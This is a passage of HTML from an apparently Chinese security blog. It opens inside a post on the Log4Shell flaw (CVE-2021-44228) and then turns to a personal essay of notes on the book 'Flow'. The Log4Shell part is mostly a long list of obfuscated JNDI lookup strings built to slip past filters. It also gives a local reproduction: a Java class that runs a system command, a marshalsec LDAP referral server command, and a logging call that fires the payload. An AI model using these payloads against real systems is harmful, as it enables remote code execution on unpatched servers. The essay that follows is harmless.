class="line">$&#123;jndi:$&#123;lower:l&#125;$&#123;lower:d&#125;$&#123;lower:a&#125;$&#123;lower:p&#125;&#125;://127.0.0.1/poc&#125;</span><br><span class="line">$&#123;$&#123;::-j&#125;$&#123;::-n&#125;$&#123;::-d&#125;$&#123;::-i&#125;:$&#123;::-l&#125;$&#123;::-d&#125;$&#123;::-a&#125;$&#123;::-p&#125;://127.0.0.1/poc&#125;</span><br><span class="line">$%7Bjndi:ldap://127.0.0.1/poc%7D</span><br><span class="line">$&#123;$&#123;env:ENV_NAME:-j&#125;ndi$&#123;env:ENV_NAME:-:&#125;$&#123;env:ENV_NAME:-l&#125;dap$&#123;env:ENV_NAME:-:&#125;127.0.0.1/poc&#125;</span><br><span class="line">$&#123;jndi:$&#123;lower:l&#125;$&#123;lower:d&#125;$&#123;lower:a&#125;$&#123;lower:p&#125;://127.0.0.1/poc&#125;</span><br><span class="line">$&#123;jndi:$&#123;lower:l&#125;$&#123;lower:d&#125;a$&#123;lower:p&#125;://127.0.0.1/poc&#125;</span><br><span class="line">$&#123;$&#123;lower:j&#125;ndi:$&#123;lower:l&#125;$&#123;lower:d&#125;a$&#123;lower:p&#125;://127.0.0.1/poc&#125;</span><br><span class="line">$&#123;$&#123;env:TEST:-j&#125;ndi$&#123;env:TEST:-:&#125;$&#123;env:TEST:-l&#125;dap$&#123;env:TEST:-:&#125;127.0.0.1/poc&#125;</span><br><span class="line">$&#123;jndi:$&#123;lower:l&#125;$&#123;lower:d&#125;ap://127.0.0.1/poc&#125;</span><br><span class="line">$&#123;jndi:ldap://127.0.0.1#127.0.0.1/poc&#125;</span><br><span class="line">$&#123;$&#123;::-j&#125;$&#123;::-n&#125;$&#123;::-d&#125;$&#123;::-i&#125;:$&#123;::-r&#125;$&#123;::-m&#125;$&#123;::-i&#125;://k123.k123.k123/poc&#125;</span><br><span class="line">$&#123;$&#123;::-j&#125;ndi:rmi://k123.k123.k123/ass&#125;</span><br><span class="line">$&#123;jndi:rmi://k8.k123.k123&#125;</span><br><span class="line">$&#123;$&#123;lower:jndi&#125;:$&#123;lower:rmi&#125;://k8.k123.k123/poc&#125;</span><br><span class="line">$&#123;$&#123;lower:$&#123;lower:jndi&#125;&#125;:$&#123;lower:rmi&#125;://k8.k123.k123/poc&#125;</span><br><span class="line">$&#123;$&#123;lower:j&#125;$&#123;lower:n&#125;$&#123;lower:d&#125;i:$&#123;lower:rmi&#125;://k8.k123.k123/poc&#125;</span><br><span class="line">j$&#123;loWer:Nd&#125;i$&#123;uPper::&#125;</span><br><span class="line">$&#123;jndi:ldaps://127.0.0.1/poc&#125;</span><br><span class="line">$&#123;jndi:iiop://127.0.0.1/poc&#125;</span><br><span class="line">$&#123;date:ldap://127.0.0.1/poc&#125;</span><br><span class="line">$&#123;java:ldap://127.0.0.1/poc&#125;</span><br><span class="line">$&#123;marker:ldap://127.0.0.1/poc&#125;</span><br><span class="line">$&#123;ctx:ldap://127.0.0.1/poc&#125;</span><br><span class="line">$&#123;lower:ldap://127.0.0.1/poc&#125;</span><br><span class="line">$&#123;upper:ldap://127.0.0.1/poc&#125;</span><br><span class="line">$&#123;main:ldap://127.0.0.1/poc&#125;</span><br><span class="line">$&#123;jvmrunargs:ldap://127.0.0.1/poc&#125;</span><br><span class="line">$&#123;sys:ldap://127.0.0.1/poc&#125;</span><br><span class="line">$&#123;env:ldap://127.0.0.1/poc&#125;</span><br><span class="line">$&#123;log4j:ldap://127.0.0.1/poc&#125;</span><br><span class="line">$&#123;j$&#123;k8s:k5:-ND&#125;i$&#123;sd:k5:-:&#125;$&#123;lower:l&#125;d$&#123;lower:a&#125;$&#123;lower:p&#125;://$&#123;hostName&#125;.&#123;&#123;interactsh-url&#125;&#125;&#125;</span><br><span class="line">$&#123;jndi:rmi://127.0.0.1&#125;/</span><br><span class="line">$&#123;jnd$&#123;123%25ff:-$&#123;123%25ff:-i:&#125;&#125;ldap://127.0.0.1/poc&#125;</span><br><span class="line">$&#123;jndi:dns://127.0.0.1&#125;</span><br><span class="line">$&#123;j$&#123;k8s:k5:-ND&#125;i:ldap://127.0.0.1/poc&#125;</span><br><span class="line">$&#123;j$&#123;k8s:k5:-ND&#125;i:ldap$&#123;sd:k5:-:&#125;//127.0.0.1/poc&#125;</span><br><span class="line">$&#123;j$&#123;k8s:k5:-ND&#125;i$&#123;sd:k5:-:&#125;ldap://127.0.0.1/poc&#125;</span><br><span class="line">$&#123;j$&#123;k8s:k5:-ND&#125;i$&#123;sd:k5:-:&#125;ldap$&#123;sd:k5:-:&#125;//127.0.0.1/poc&#125;</span><br><span class="line">$&#123;$&#123;k8s:k5:-J&#125;$&#123;k8s:k5:-ND&#125;i$&#123;sd:k5:-:&#125;ldap://127.0.0.1/poc&#125;</span><br><span class="line">$&#123;$&#123;k8s:k5:-J&#125;$&#123;k8s:k5:-ND&#125;i$&#123;sd:k5:-:&#125;ldap&#123;sd:k5:-:&#125;//127.0.0.1/poc&#125;</span><br><span class="line">$&#123;$&#123;k8s:k5:-J&#125;$&#123;k8s:k5:-ND&#125;i$&#123;sd:k5:-:&#125;l$&#123;lower:D&#125;ap$&#123;sd:k5:-:&#125;//127.0.0.1/poc&#125;</span><br><span class="line">$&#123;j$&#123;k8s:k5:-ND&#125;i$&#123;sd:k5:-:&#125;$&#123;lower:L&#125;dap$&#123;sd:k5:-:&#125;//127.0.0.1/poc</span><br><span class="line">$&#123;$&#123;k8s:k5:-J&#125;$&#123;k8s:k5:-ND&#125;i$&#123;sd:k5:-:&#125;l$&#123;lower:D&#125;a$&#123;::-p&#125;$&#123;sd:k5:-:&#125;//127.0.0.1/poc&#125;</span><br><span class="line">$&#123;jndi:$&#123;lower:l&#125;$&#123;lower:d&#125;a$&#123;lower:p&#125;://127.0.0.1&#125;</span><br><span class="line">$&#123;jnd$&#123;upper:i&#125;:ldap://127.0.0.1/poc&#125;</span><br><span class="line">$&#123;j$&#123;$&#123;:-l&#125;$&#123;:-o&#125;$&#123;:-w&#125;$&#123;:-e&#125;$&#123;:-r&#125;:n&#125;di:ldap://127.0.0.1/poc&#125;</span><br><span class="line">$&#123;jndi:ldap://127.0.0.1#127.0.0.1:1389/poc&#125;</span><br><span class="line">$&#123;$&#123;::-j&#125;$&#123;::-n&#125;$&#123;::-d&#125;$&#123;::-i&#125;:$&#123;::-l&#125;$&#123;::-d&#125;$&#123;::-a&#125;$&#123;::-p&#125;://127.0.0.1/poc&#125;</span><br><span class="line">$&#123;$&#123;::-j&#125;$&#123;::-n&#125;$&#123;::-d&#125;$&#123;::-i&#125;:$&#123;::-r&#125;$&#123;::-m&#125;$&#123;::-i&#125;://127.0.0.1/poc&#125;</span><br><span class="line">$&#123;$&#123;lower:jndi&#125;:$&#123;lower:ldap&#125;://127.0.0.1/poc&#125;</span><br><span class="line">$&#123;$&#123;::-j&#125;ndi:rmi://127.0.0.1/poc&#125;</span><br><span class="line">$&#123;$&#123;lower:$&#123;lower:jndi&#125;&#125;:$&#123;lower:ldap&#125;://127.0.0.1/poc&#125;</span><br><span class="line">$&#123;$&#123;lower:jndi&#125;:$&#123;lower:rmi&#125;://127.0.0.1/poc&#125;</span><br><span class="line">$&#123;$&#123;lower:j&#125;$&#123;lower:n&#125;$&#123;lower:d&#125;i:$&#123;lower:ldap&#125;://127.0.0.1/poc&#125;</span><br><span class="line">$&#123;$&#123;lower:$&#123;lower:jndi&#125;&#125;:$&#123;lower:rmi&#125;://127.0.0.1/poc&#125;</span><br><span class="line">$&#123;$&#123;lower:j&#125;$&#123;upper:n&#125;$&#123;lower:d&#125;$&#123;upper:i&#125;:$&#123;lower:l&#125;d$&#123;lower:a&#125;p://127.0.0.1/poc&#125;</span><br><span class="line">$&#123;$&#123;lower:j&#125;$&#123;upper:n&#125;$&#123;lower:d&#125;$&#123;upper:i&#125;:$&#123;lower:r&#125;m$&#123;lower:i&#125;://127.0.0.1/poc&#125;</span><br><span class="line">$&#123;j$&#123;env:DOESNOTEXIST:-&#125;ndi:ldap://127.0.0.1/poc&#125;</span><br><span class="line">$&#123;j$&#123;env:DOESNOTEXIST:-&#125;ndi:rmi://127.0.0.1/poc&#125;</span><br><span class="line">$&#123;$&#123;: : : : ::: :: :: : :::-j&#125;ndi:ldap://127.0.0.1/poc&#125;</span><br><span class="line">$&#123;$&#123;: : : : ::: :: :: : :::-j&#125;ndi:rmi://127.0.0.1/poc&#125;</span><br><span class="line">$&#123;$&#123;::::::::::::::-j&#125;ndi:ldap://127.0.0.1/poc&#125;</span><br><span class="line">$&#123;$&#123;::::::::::::::-j&#125;ndi:rmi://127.0.0.1/poc&#125;</span><br><span class="line">$&#123;$&#123;::-j&#125;$&#123;::-n&#125;$&#123;::-d&#125;$&#123;::-i&#125;:$&#123;::-l&#125;$&#123;::-d&#125;$&#123;::-a&#125;$&#123;::-p&#125;://127.0.0.1/poc&#125;</span><br><span class="line"></span><br><span class="line">（copy自网络）</span><br></pre></td></tr></table></figure>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>创建LDAPRefServer</p>
+<p>poc：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public class Poc &#123;</span><br><span class="line">    public Poc() &#123;</span><br><span class="line">        try&#123;</span><br><span class="line">            String[] cmd = &#123;&quot;open&quot;, &quot;/System/Applications/Calculator.app&quot;&#125;;</span><br><span class="line">            Process process = Runtime.getRuntime().exec(cmd);</span><br><span class="line">            process.waitFor();</span><br><span class="line">        &#125;catch (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        Poc poc = new Poc();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8200</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer &quot;http://127.0.0.1:8200/#Poc&quot; </span><br></pre></td></tr></table></figure>
+
+<p>执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">package net.uxss.log4j2;</span><br><span class="line"></span><br><span class="line">import org.apache.logging.log4j.*;</span><br><span class="line"></span><br><span class="line">public class Log4j2Test &#123;</span><br><span class="line"></span><br><span class="line">    private static final Logger logger = LogManager.getLogger(Log4j2Test.class);</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        logger.error(&quot;$&#123;jndi:ldap://127.0.0.1:1389/Poc&#125;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img lazyload src="/images/loading.svg" data-src="1.png"></p>
+
+                </div>
+
+                <div class="home-article-meta-info-container">
+    <div class="home-article-meta-info">
+        <span><i class="fas fa-history"></i>&nbsp;<span class="home-article-date" data-date="Wed Dec 15 2021 21:00:00 GMT+0800">2021-12-15</span></span>
+        
+            <span class="home-article-category"><i class="fas fa-folder"></i>&nbsp;
+                <ul>
+                    
+                        <li>
+                            
+                            <a href="/categories/JAVA%E5%AE%89%E5%85%A8/">JAVA安全</a>&nbsp;
+                        </li>
+                    
+                    
+                </ul>
+            </span>
+        
+        
+            <span class="home-article-tag">
+                <i class="fas fa-tags"></i>&nbsp;
+                <ul>
+                    
+                        <li>
+                            
+                            <a href="/tags/JAVA/">JAVA</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            </span>
+        
+    </div>
+
+    <a href="/CVE-2021-44228%20Log4Shell/">Read more&nbsp;<i class="fas fa-angle-right"></i></a>
+</div>
+
+            </li>
+        
+            <li class="home-article-item">
+
+                
+
+                <h3 class="home-article-title">
+                    <a href="/%E8%8E%AB%E5%90%91%E5%A4%96%E6%B1%82%EF%BC%8C%E5%8F%8D%E6%B1%82%E8%AF%B8%E5%B7%B1/">
+                        莫向外求，反求诸己
+                    </a>
+                </h3>
+
+                <!-- <div class="home-article-content markdown-body">
+                    
+                        
+
+这篇小文可以理解为是《心流：最优体验心理学》的笔记和摘录，和大多数人一样，在注意力和自律上并不能很好的战胜欲望，但是内心却一直在寻找一种心境，可以让自己感受到内心愉悦、幸福，而不想一直困在世俗的制度、条例、奖赏、惩罚之中。寻求内心的安宁以及如何与这个社会共处的平衡。
+
+
+
+
+
+
+
+
+
+怎么定义幸福？漫长的人生岁月不仅幸福难求，还时时处于焦虑和倦怠之中。
+每个人对于自己这辈子希望完成的事，大致总有个模糊的概念，目标达到的程度就是衡量生活品质的指标。如果它始终遥不可及，我们就会变得怨天尤人、愤世嫉俗；但只要能完成一小部分，我们就会觉得幸福满足。世上大多数人的人生目标都很简单：平安地活着，养育一儿半女；如果可能的话，再加上那么一点儿舒适与尊严。
+我们从小就以为，人生最重要的是未来。父母教孩子养成好习惯，为的是长大后对他们有益；老师向学生保证，无聊的课程日后有助于他们谋职；公司主管告诉新员工，要有耐心，努力工作，因为有朝一日会晋升为主管—然而在漫长的晋升之路尽头，退休的时刻也会同时到来。爱默生曾说：“我们对生活有种种期许，却从未真正生活过。”一个穷困的小女孩也从童话故事中学到：果酱和面包永远是明天的事，今天就是吃不到。
+我们应该要认识到，文明就是建立在压抑个人欲望基础上的。社会成员不论乐意与否，都被迫接受既定的习惯与技能，否则就不可能维持社会秩序和复杂的分工制度。个人社会化是必然的；社会化的真谛在于使个人依赖社会的控制，并对赏罚有既定的反应；社会化的最高境界就是使每个人都完全认同社会秩序，根本不想触犯任何规则。社会为了使我们实现它的目标，有若干手段：生理需求和基因制约。除了痛苦，社会控制也以快乐作为使人就范的诱饵。工作一辈子并遵守法律的报酬就是美好生活，这一招其实就是利用人性的弱点。人的每个欲望——从性欲到侵略，从寻求安全感到接受改变——几乎都成为政客、教会、企业及广告界控制社会的手段。
+跟随本能的享乐，即时满足，并不会构建有序的意识，反而会加速其无序的状态，进而产生焦虑、烦躁等负面情绪。而一个“well being“需要兼顾生理和精神的双重满足。
+在当今社会的运行机制下，外界展示给你的，往往通过某种奖励吸引你去追随，它们的动机大多是想要控制你，例如广告，通过各个角度来暗示你可以通过购买xx商品获得生活品质的改善，不断的会有新的广告、商品，提高生活品质是一件永远没有尽头的苦役，最终陷入期望值不断升高的恶性循环中无力自拔。
+纵然明知物质的丰裕并不能带来幸福，但我们还是习惯外求，不停地追逐外在的目标，希望借此改善生活。财富、地位、权力是现代文明最重视的幸福象征。我们总以为，有钱、有名、俊俏美丽的人一定过得很充实，尽管各方面证据可能显示，他们生活得并不惬意。但我们依然坚信，只要能拥有跟他们同样的象征特质，就会更幸福。享乐是高水准生活的重要一环，但享乐本身并不能带来幸福。睡眠、休息、食物与性，都属于恢复“均衡”的体验，在肉体需求引起精神熵以后，重整意识的秩序。它们并不能带动心灵的成长，也不能增加自我的复杂性。换言之，享乐虽有助于维持意识的秩序，却无法在意识中创造新秩序。
+摆脱社会制约的首要之务便是控制本能的冲动，因为只要我们凡事跟着感觉走，一举一动就不难预测，别人就很容易利用我们的好意，达到他们自私的目的。幸运的是，还是有不少人能逃脱出来。这些人尽管物质条件不够优越，但仍然能改善生活品质，不但知足常乐，也常能使周遭的人生活得更快乐。
+古老的故事告诉我们，英雄在“从此过上幸福快乐的生活”之前，必须与喷火毒龙搏斗，与居心险恶的魔法师抗争。同样的譬喻也适用于心灵的冒险。我认为幸福之所以难求，最主要是因为人类自以为是地认定宇宙是为满足我们的需求而存在的，然而现实却大相径庭——生命中其实深埋着沮丧的种子。只要某种欲望一时得到满足，我们就立刻渴望得到更多。这种长期的贪得无厌，是追求知足常乐途中的另一重障碍。
+一般人想进一步充实自己的生活时，不但会想到享乐，还会想到虽然与享乐重叠，但必须用不同字眼表达的另一种感受——乐趣。乐趣具有向前发展的特性，并蕴涵新鲜感和成就感。经历过有乐趣的事，我们就感觉自己有了改变，自我有了成长；在某些方面，这次体验已使我们变得更复杂、更丰富。
+真正的幸福，是当你全心全意投入一件事，把自己置之度外的时候，获得的副产品。你直接追求的并不是幸福，而是把自己变得更复杂——在这个变复杂的过程中，你会找到乐趣，这个状态就是幸福的。人生要的不是最后终点的结果，而是每时每刻点点滴滴成长的过程。成长不仅仅是在校学生的事儿。成长也不是为了达到什么目的的手段。成长本身，就是我们的目的。
+这个全身心投入的事物每个人的理解可能都不一样，在如今，很多人陷入一个误区，“享乐==幸福”，如米哈里所言，“享乐的片刻转瞬即逝”。相信都能理解，例如无法抗拒食物、酒精、性爱等等，无穷无尽的欲念，当满足一个欲念后，随之而来的是空虚以及更强烈的欲念。人首先作为一种动物，所有的本能都是受基因所驱使，当然“跟随基因的反应，享受自然的乐趣，寻求快乐是基因为物种延续而设的一种即时反射，其目的非关个人利益。但我们应该认清事实真相。”
+全身心地投入一桩事物，达到忘我的程度，并由此获得内心秩序和安宁时的状态。心流其实是一种生活方式，而且是最高级的生活方式。你想幸福吗？追求心流。它背后更大的逻辑是，你要通过锻炼控制自己的意识，去获得真正的幸福。我们做事的时候并不在乎结果能不能给自己带来多大的利益，而是专注于做这件事本身，从中获得乐趣。这句话听着特别像“心灵鸡汤”，但它恰恰是一个站得住脚的理论！
+心流对于心流的定义有很多种，我最欣赏这个定义，“沉浸于事物本身，这就是心流。”
+就是当你特别专注地做一件目标明确而又有挑战的事情，而你的能力恰好能接住这个挑战时，你可能会进入的一种状态。它的特征是你做这件事的时候会忘记自己，忘记时间的流逝，你能体察到所有相关的信息，不管工作多复杂你都毫不费力，而且有强烈的愉悦感。
+这个过程可以理解为精神世界的负墒，最典型、最壮丽也最奇妙的负熵过程就是这个宇宙的最大奇迹——生命，从无序到有序。从这个角度来说，心流就是大脑的生命。当心熵比较高的时候，在一片混乱的情况下，大脑的做功能力很低，很多心理能量都浪费在内耗上了。但一旦进入心流状态，心理能量就围绕着同一个主题组织起来，向同一个方向高效率地输出。这也就是契克森米哈赖反复强调的，人在心流状态下的表现最好。
+“首先，这种体验出现在我们面临一份可完成的工作时。
+其次，我们必须能够全神贯注于这件事情。
+第三，明确的目标.
+第四，即时的反馈。
+第五，我们能深入而毫不牵强地投入到行动之中，日常生活的忧虑和沮丧都因此一扫而空。
+第六，充满乐趣的体验使人觉得能自由控制自己的行动。
+第七，进入“忘我”状态，但心流体验告一段落后，自我感觉又会变得强烈。
+第八，时间感会改变——几小时犹如几分钟，几分钟也可能变得像几小时那么漫长。这些元素结合成一种深刻的愉悦感，带来无比的报偿，并扩展成极大的能量，仅是感觉它的存在就已值回“票价”了。”
+最简单的理解，有些人习惯信笔涂鸦，有些人咀嚼东西或抽烟、梳头发、哼曲子，目的无非是通过有规律的行动，把意识规范得更有秩序。这些活动是一种“小型心流”，可以帮助我们度过日常生活的低潮。
+进入心流状态后，“当事人全神贯注，一切动作都不假思索，几乎完全自动自发；他们的知觉甚至泯灭，人与行动完全合一。”“在日常生活中，我们经常被怀疑或疑问打断：“我为什么这么做？我是否该做这件事？”我们一再追问行动的必要性，并批判它们背后的理由。然而在心流中没有反省的空间，所有行动宛如一股魔力，带着我们勇往直前。”
+“最常述及的心流体验的特征就是，在心流中会把生活中所有不快乐的事忘得一干二净。这是因为要想从活动中汲取乐趣，必须全心全意地专注于手头的工作，所产生的重要副产品——心流状态下的心灵完全没有容纳不相干资讯的余地。”
+“体育具备造就心流的最佳条件：明确的目标，即时的回馈，易学难精带来的上不封顶的挑战性。体育的最大功能是帮助人控制自己：既学习控制自己的身体——这很好理解，体操、田径、游泳、球类，都要在控制身体上下大功夫，又要学习控制自己的精神，控制自己的注意力。”
+“冒险专家的乐趣并非来自危险本身，而是来自他们使危险降至最低的能力。真正令他们乐此不疲的，不是追逐危险的病态悚栗，而是一种有办法控制潜在危险的感觉。”
+“一位骄傲的作家用字与词创造一个令人沉浸的世界。在这个过程中，他不断挑战自我。就像海明威一样，三十岁的时候，人们以为《战地春梦》就是他的最高水准了；然而，他又用了二十多年锤炼手艺，直到巅峰之作《老人与海》问世。海明威的大半生，一直用写作催生心流涓涓不断。在这个硬汉世界中，他是唯一的君王。直到有一天，世界失控，沙堆崩溃。”
+人生目标人生目标的获得不能抄袭，没有捷径。米哈里说：获得最优体验的手段，“不能浓缩成一个秘诀，也不能背诵下来重复使用……每个人必须自行从不断的尝试与错误中学习”。米哈里问读者：什么是自得其乐？他自己的回答是：“就是‘拥有自足目标的自我’，大多数人的目标都受生理需要或社会传统的制约，亦即来自外界。自得其乐的人，主要目标都从意识评估过的体验中涌现，并以自我为依据。”外界向你提供目标时，往往以某种奖励吸引你追随它。世上大多数奖励的动机是控制你
+在讨论心流与目标时，米哈里还提出了“自成目标”的概念，即目标是做你喜欢做的事情，而非做这件事情的报酬，尽管有时也存在报酬，有时也有社会效益。也就是为艺术而艺术，为科学而科学，为你喜欢的劳作而劳作。米哈里说：“开始时靠目标证明努力的必要，到后来却变成靠努力证明目标的重要性。”“登上山顶之所以重要，只因它证明了我们爬过山，爬山的过程才是真正的目标。”
+“痛下决心追求一个重要的目标，各式各样的活动都能汇集成统一的心流体验时，意识就呈现出一片祥和。知道自己要什么，并朝这个方向努力的人，感觉、思想、行动都能配合无间，内心的和谐自然涌现。生活在和谐之中的人，不论做什么、遭遇什么，都不会把精神能量浪费在怀疑、后悔、罪恶感及恐惧之上，精力永远用在有益的方面。对生命胸有成竹的人，内心的力量与宁静，就是内在一致的最高境界。方向、决心加上和谐，就能把生命转变成天衣无缝的心流体验，并赋予人生意义。达到这种境界的人再也不觉得匮乏。意识井然有序的人不需要害怕出乎意料的事，甚至也不惧怕死亡，活着的每一刻都饶富意义，大多数时候也都乐趣无穷。”
+首先要找到一个终生的目标，其次不要害怕复杂性，这就是对你人生意义的挑战，而你可以应对的技能是“行动式生活”与“反省式生活”相结合。最终，你既有独特的个人特性，又与周围世界、人们所整合，“只要个人目标与宇宙心流汇合，意义的问题也就迎刃而解了”。
+但是正如文中所说：“伟大的音乐、建筑、艺术、诗歌、戏剧、舞蹈、哲学、宗教，都是以和谐克服混沌的好榜样”。降熵过程有高下，美有高下，技艺有高下，心流也有高下。原本的混沌越多，整合进去的元素越复杂，这个心流就越伟大。那么，自然，人生意义也有高下。那些能够整合无比复杂的人生、找到人生意义，整合无比复杂的世界、形成自己的世界观，整合无比复杂经常是相对矛盾的价值观、形成自己的价值观的人，有最大的“大心流”。
+文中所推崇的人生最优体验，不是幸福、快乐这点肤浅的感受，而是奋斗、挣扎、咬牙坚持，最终，是整合之后的巅峰体验。这才是心流的真意。
+进入心流“最典型的例子就是冥想。佛家经常用冥想来降伏内心那瀑布一样奔腾如雷的念头。在冥想中，你摒除杂念，心灵澄净，如一道清澈的心流。经过长期练习之后，哪怕不在冥想之中，你的心灵也会比常人更平静，遇到意外变故时能更快地集中注意力。换句话说，你的心熵整体降低了。”
+高僧冥想多年才能达到波澜不惊，我亦很难进入心流状态，待到可以稳定进入心流之时，再来补充这最后一章节。
+
+                    
+                </div> -->
+                <div class="article-content markdown-body">
+                    <blockquote>
+<blockquote>
+<p>这篇小文可以理解为是《心流：最优体验心理学》的笔记和摘录，和大多数人一样，在注意力和自律上并不能很好的战胜欲望，但是内心却一直在寻找一种心境，可以让自己感受到内心愉悦、幸福，而不想一直困在世俗的制度、条例、奖赏、惩罚之中。寻求内心的安宁以及如何与这个社会共处的平衡。</p>
+</blockquote>
+</blockquote>
+
+<div style="position: relative; width: 100%; height: 0; padding-bottom: 75%;">
+<iframe src="//player.bilibili.com/player.html?aid=764679443&bvid=BV1Dr4y1S7wj&cid=456577034&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true" style="position: absolute; width: 100%; height: 100%; Left: 0; top: 0;"></iframe></div>
+
+
+
+
+<h2 id="怎么定义幸福？"><a href="#怎么定义幸福？" class="headerlink" title="怎么定义幸福？"></a>怎么定义幸福？</h2><p>漫长的人生岁月不仅幸福难求，还时时处于焦虑和倦怠之中。</p>
+<p>每个人对于自己这辈子希望完成的事，大致总有个模糊的概念，目标达到的程度就是衡量生活品质的指标。如果它始终遥不可及，我们就会变得怨天尤人、愤世嫉俗；但只要能完成一小部分，我们就会觉得幸福满足。世上大多数人的人生目标都很简单：平安地活着，养育一儿半女；如果可能的话，再加上那么一点儿舒适与尊严。</p>
+<p>我们从小就以为，人生最重要的是未来。父母教孩子养成好习惯，为的是长大后对他们有益；老师向学生保证，无聊的课程日后有助于他们谋职；公司主管告诉新员工，要有耐心，努力工作，因为有朝一日会晋升为主管—然而在漫长的晋升之路尽头，退休的时刻也会同时到来。爱默生曾说：“我们对生活有种种期许，却从未真正生活过。”一个穷困的小女孩也从童话故事中学到：果酱和面包永远是明天的事，今天就是吃不到。</p>
+<p>我们应该要认识到，文明就是建立在压抑个人欲望基础上的。社会成员不论乐意与否，都被迫接受既定的习惯与技能，否则就不可能维持社会秩序和复杂的分工制度。个人社会化是必然的；社会化的真谛在于使个人依赖社会的控制，并对赏罚有既定的反应；社会化的最高境界就是使每个人都完全认同社会秩序，根本不想触犯任何规则。社会为了使我们实现它的目标，有若干手段：生理需求和基因制约。除了痛苦，社会控制也以快乐作为使人就范的诱饵。工作一辈子并遵守法律的报酬就是美好生活，这一招其实就是利用人性的弱点。人的每个欲望——从性欲到侵略，从寻求安全感到接受改变——几乎都成为政客、教会、企业及广告界控制社会的手段。</p>
+<p>跟随本能的享乐，即时满足，并不会构建有序的意识，反而会加速其无序的状态，进而产生焦虑、烦躁等负面情绪。而一个“well being“需要兼顾生理和精神的双重满足。</p>
+<p>在当今社会的运行机制下，外界展示给你的，往往通过某种奖励吸引你去追随，它们的动机大多是想要控制你，例如广告，通过各个角度来暗示你可以通过购买xx商品获得生活品质的改善，不断的会有新的广告、商品，提高生活品质是一件永远没有尽头的苦役，最终陷入期望值不断升高的恶性循环中无力自拔。</p>
+<p>纵然明知物质的丰裕并不能带来幸福，但我们还是习惯外求，不停地追逐外在的目标，希望借此改善生活。财富、地位、权力是现代文明最重视的幸福象征。我们总以为，有钱、有名、俊俏美丽的人一定过得很充实，尽管各方面证据可能显示，他们生活得并不惬意。但我们依然坚信，只要能拥有跟他们同样的象征特质，就会更幸福。享乐是高水准生活的重要一环，但享乐本身并不能带来幸福。睡眠、休息、食物与性，都属于恢复“均衡”的体验，在肉体需求引起精神熵以后，重整意识的秩序。它们并不能带动心灵的成长，也不能增加自我的复杂性。换言之，享乐虽有助于维持意识的秩序，却无法在意识中创造新秩序。</p>
+<p>摆脱社会制约的首要之务便是控制本能的冲动，因为只要我们凡事跟着感觉走，一举一动就不难预测，别人就很容易利用我们的好意，达到他们自私的目的。幸运的是，还是有不少人能逃脱出来。这些人尽管物质条件不够优越，但仍然能改善生活品质，不但知足常乐，也常能使周遭的人生活得更快乐。</p>
+<p>古老的故事告诉我们，英雄在“从此过上幸福快乐的生活”之前，必须与喷火毒龙搏斗，与居心险恶的魔法师抗争。同样的譬喻也适用于心灵的冒险。我认为幸福之所以难求，最主要是因为人类自以为是地认定宇宙是为满足我们的需求而存在的，然而现实却大相径庭——生命中其实深埋着沮丧的种子。只要某种欲望一时得到满足，我们就立刻渴望得到更多。这种长期的贪得无厌，是追求知足常乐途中的另一重障碍。</p>
+<p>一般人想进一步充实自己的生活时，不但会想到享乐，还会想到虽然与享乐重叠，但必须用不同字眼表达的另一种感受——乐趣。乐趣具有向前发展的特性，并蕴涵新鲜感和成就感。经历过有乐趣的事，我们就感觉自己有了改变，自我有了成长；在某些方面，这次体验已使我们变得更复杂、更丰富。</p>
+<p>真正的幸福，是当你全心全意投入一件事，把自己置之度外的时候，获得的副产品。你直接追求的并不是幸福，而是把自己变得更复杂——在这个变复杂的过程中，你会找到乐趣，这个状态就是幸福的。人生要的不是最后终点的结果，而是每时每刻点点滴滴成长的过程。成长不仅仅是在校学生的事儿。成长也不是为了达到什么目的的手段。成长本身，就是我们的目的。</p>
+<p>这个全身心投入的事物每个人的理解可能都不一样，在如今，很多人陷入一个误区，“享乐==幸福”，如米哈里所言，“享乐的片刻转瞬即逝”。相信都能理解，例如无法抗拒食物、酒精、性爱等等，无穷无尽的欲念，当满足一个欲念后，随之而来的是空虚以及更强烈的欲念。人首先作为一种动物，所有的本能都是受基因所驱使，当然“跟随基因的反应，享受自然的乐趣，寻求快乐是基因为物种延续而设的一种即时反射，其目的非关个人利益。但我们应该认清事实真相。”</p>
+<p>全身心地投入一桩事物，达到忘我的程度，并由此获得内心秩序和安宁时的状态。心流其实是一种生活方式，而且是最高级的生活方式。你想幸福吗？追求心流。它背后更大的逻辑是，你要通过锻炼控制自己的意识，去获得真正的幸福。我们做事的时候并不在乎结果能不能给自己带来多大的利益，而是专注于做这件事本身，从中获得乐趣。这句话听着特别像“心灵鸡汤”，但它恰恰是一个站得住脚的理论！</p>
